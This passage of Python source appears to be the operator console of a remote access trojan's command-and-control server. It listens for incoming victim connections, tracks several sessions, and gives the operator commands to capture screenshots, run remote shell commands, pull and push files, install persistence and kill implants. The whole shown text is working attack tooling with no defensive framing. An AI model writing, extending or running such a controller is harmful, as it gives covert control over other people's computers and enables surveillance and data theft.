    send_frame(c, blob)
    ack = recv_frame(c)
    print(ack.decode(errors="ignore"))

def cmd_persist(cid):
    c,_ = clients[cid]
    send_line(c, "PERSIST")
    print(recv_frame(c).decode(errors="ignore"))

def main():
    global cur
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HOST, PORT)); srv.listen(10)
    print(f"[*] listening {HOST}:{PORT}")
    threading.Thread(target=accept_loop, args=(srv,), daemon=True).start()
    print("commands: list | use <id> | screen [out.jpg] | shell <cmd> | download <remote> <local> | upload <local> <remote> | persist | kill <id> | quit")
    while True:
        try: line = input(f"({cur if cur is not None else '-'})> ").strip()
        except: break
        if not line: continue
        if line == "list":
            with lock:
                for k,(c,a) in clients.items(): print(f"{k} : {a[0]}:{a[1]} {'*' if k==cur else ''}")
            continue
        if line.startswith("use "):
            cid = int(line.split()[1])
            if cid in clients: cur = cid; print(f"[*] using {cid}")
            else: print("[-] no session")
            continue
        if line == "quit": break
        if line.startswith("kill "):
            cid = int(line.split()[1])
            try:
                send_line(clients[cid][0], "EXIT")
                clients[cid][0].close()
            except: pass
            clients.pop(cid, None)
            if cur == cid: cur = None
            continue
        if cur is None or cur not in clients:
            print("[-] select session: use <id>"); continue
        try:
            if line.startswith("screen"):
                p = line.split(maxsplit=1)
                save = p[1] if len(p) > 1 else f"screen_{cur}.jpg"
                cmd_screen(cur, save)
            elif line.startswith("shell "):
                cmd_shell(cur, line[6:])
            elif line.startswith("download "):
                _, r, l = shlex.split(line)
                cmd_download(cur, r, l)
            elif line.startswith("upload "):
                _, l, r = shlex.split(line)
                cmd_upload(cur, l, r)
            elif line == "persist":
                cmd_persist(cur)
            else: print("[-] unknown")
        except Exception as e:
            print(f"[-] session error: {e}")
            try: clients[cur][0].close()
            except: pass
            clients.pop(cur, None); cur = None

if __name__ == "__main__":
    if len(sys.argv) >= 3: HOST, PORT = sys.argv[1], int(sys.argv[2])
    main()
